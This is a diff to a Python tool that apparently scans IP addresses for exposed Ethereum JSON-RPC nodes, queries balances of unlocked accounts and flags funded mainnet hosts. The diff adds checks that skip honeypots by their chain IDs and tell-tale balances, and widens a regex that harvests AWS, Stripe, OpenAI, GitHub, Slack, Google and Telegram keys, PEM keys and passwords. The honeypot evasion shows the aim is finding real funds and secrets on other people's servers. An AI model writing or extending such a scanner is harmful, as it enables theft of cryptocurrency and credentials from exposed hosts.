@@ -4,14 +4,25 @@ import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 TIMEOUT = 6
+
+# Honeypot signatures — these exact balances appear on fake/trap nodes
+HONEYPOT_ETH_BALANCES = {
+    0.158972490234375,   # mass-deployed Linode honeypot
+}
+HONEYPOT_CHAINS = {1337, 31337, 8889, 42069, 10946, 1234, 9999}
+
+# High-value key patterns only — no generic hex (too many false positives)
 KEY_RE = re.compile(
-    r'(AKIA[0-9A-Z]{16}'
-    r'|(?:sk|rk|pk)[-_][a-zA-Z0-9]{20,}'
-    r'|ghp_[a-zA-Z0-9]{36}'
-    r'|gho_[a-zA-Z0-9]{36}'
-    r'|xox[baprs]-[0-9A-Za-z\-]{10,}'
-    r'|-----BEGIN [A-Z ]+ KEY-----'
-    r'|[0-9a-fA-F]{64}'
+    r'(AKIA[0-9A-Z]{16}'                                          # AWS access key
+    r'|(?:sk|rk)-[a-zA-Z0-9]{20,}'                               # Stripe sk/rk
+    r'|sk-[a-zA-Z0-9]{32,}'                                       # OpenAI
+    r'|ghp_[a-zA-Z0-9]{36}'                                       # GitHub PAT
+    r'|gho_[a-zA-Z0-9]{36}'                                       # GitHub OAuth
+    r'|xox[baprs]-[0-9A-Za-z\-]{10,}'                            # Slack
+    r'|-----BEGIN [A-Z ]+ KEY-----'                               # PEM key
+    r'|AIza[0-9A-Za-z\-_]{35}'                                    # Google API key
+    r'|[0-9]{9,10}:[A-Za-z0-9_\-]{35}'                           # Telegram bot token
+    r'|(?:AWS_SECRET|aws_secret_access_key)\s*[=:]\s*[^\s"\']{20,}'
     r'|(?:password|passwd|secret|token|api.?key|private.?key|access.?key)\s*[=:]\s*["\']?([^\s"\'<>]{8,50}))',
     re.IGNORECASE
 )
@@ -124,8 +135,11 @@ def probe_eth(ip):
                   'chain_id': chain_id, 'accounts': accounts,
                   'balances': {}, 'total_eth': 0}
 
+        if chain_id in HONEYPOT_CHAINS:
+            return None  # Known testnet/honeypot chain
+
         if chain_id == 1:
-            # Real mainnet — check balances via local node
+            # Real mainnet — check balances
             for addr in accounts[:10]:
                 try:
                     bal = requests.post(f'http://{ip}:8545',
@@ -133,14 +147,19 @@ def probe_eth(ip):
                               'params': [addr, 'latest'], 'id': 1},
                         timeout=TIMEOUT).json().get('result', '0x0')
                     eth = int(bal, 16) / 1e18
+                    # Skip known honeypot balance signatures
+                    if eth in HONEYPOT_ETH_BALANCES:
+                        return None
                     result['balances'][addr] = eth
                     result['total_eth'] += eth
                 except:
                     pass
             if result['total_eth'] > 0:
                 print(f'  MAINNET FUNDED: {ip} total={result["total_eth"]:.4f} ETH', flush=True)
+            else:
+                return None  # Mainnet but empty
         else:
-            print(f'  ETH TESTNET: {ip} chain={chain_id} accounts={len(accounts)}', flush=True)
+            return None  # Unknown chain — skip
 
         return result
     except:
